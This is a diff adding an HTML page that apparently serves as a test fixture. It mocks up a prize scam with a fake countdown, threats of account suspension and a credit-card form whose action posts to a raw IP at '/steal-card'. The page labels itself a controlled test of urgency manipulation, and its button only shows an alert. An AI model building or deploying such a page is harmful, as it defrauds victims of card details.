@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CRITICAL FLASH SALE - 95% OFF Apple iPhone 15 Pro</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0f172a;
+      color: #f8fafc;
+      margin: 0;
+      padding: 30px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .demo-disclaimer {
+      background: #78350f;
+      border: 1px solid #f59e0b;
+      color: #fef3c7;
+      padding: 10px 16px;
+      border-radius: 8px;
+      font-size: 13px;
+      margin-bottom: 24px;
+      max-width: 500px;
+      text-align: center;
+    }
+    .deal-card {
+      background: #1e293b;
+      border: 2px solid #ef4444;
+      border-radius: 14px;
+      padding: 24px;
+      max-width: 480px;
+      width: 100%;
+      text-align: center;
+      box-shadow: 0 0 25px rgba(239, 68, 68, 0.3);
+    }
+    .urgency-badge {
+      background: #ef4444;
+      color: white;
+      font-weight: 800;
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 13px;
+      display: inline-block;
+      margin-bottom: 12px;
+    }
+    .timer {
+      font-size: 32px;
+      font-weight: 800;
+      color: #f87171;
+      font-family: monospace;
+      margin: 12px 0;
+    }
+    .price {
+      font-size: 28px;
+      font-weight: 800;
+      color: #4ade80;
+    }
+    .old-price {
+      text-decoration: line-through;
+      color: #94a3b8;
+      font-size: 18px;
+      margin-left: 8px;
+    }
+    .checkout-form {
+      margin-top: 20px;
+      text-align: left;
+    }
+    .form-group {
+      margin-bottom: 12px;
+    }
+    label {
+      font-size: 12px;
+      color: #cbd5e1;
+      display: block;
+      margin-bottom: 4px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      background: #0f172a;
+      border: 1px solid #334155;
+      color: white;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+    .btn-buy {
+      width: 100%;
+      background: #ef4444;
+      color: white;
+      font-weight: 700;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="demo-disclaimer">
+    ⚠️ <strong>CONTROLLED TEST SCENARIO:</strong> Tests psychological urgency signals ("account will be suspended / expires in minutes") and credit card input traps.
+  </div>
+
+  <div class="deal-card">
+    <div class="urgency-badge">🔥 IMMEDIATE ACTION REQUIRED</div>
+    <h1>Special Reward: Apple iPhone 15 Pro Max</h1>
+    <p>You have won our anniversary lottery! Claim your prize within the timer or account access will be suspended permanently.</p>
+
+    <div class="timer" id="timer">02:47</div>
+
+    <div>
+      <span class="price">$1.00</span>
+      <span class="old-price">$1,199.00</span>
+    </div>
+
+    <form class="checkout-form" action="http://45.33.12.98/steal-card" method="POST">
+      <div class="form-group">
+        <label>Full Name</label>
+        <input type="text" placeholder="John Doe">
+      </div>
+      <div class="form-group">
+        <label>Credit Card Number</label>
+        <input type="text" autocomplete="cc-number" placeholder="4111 2222 3333 4444">
+      </div>
+      <div class="form-group">
+        <label>CVV / Expiration</label>
+        <input type="text" placeholder="123 | MM/YY">
+      </div>
+      <button type="button" class="btn-buy" onclick="alert('Demo page only - no real payment processed.')">
+        Claim Prize Immediately ($1.00)
+      </button>
+    </form>
+  </div>
+
+  <script>
+    // Fake countdown timer
+    let seconds = 167;
+    const timerEl = document.getElementById('timer');
+    setInterval(() => {
+      if (seconds > 0) {
+        seconds--;
+        const m = Math.floor(seconds / 60);
+        const s = seconds % 60;
+        timerEl.textContent = `0${m}:${s < 10 ? '0' : ''}${s}`;
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
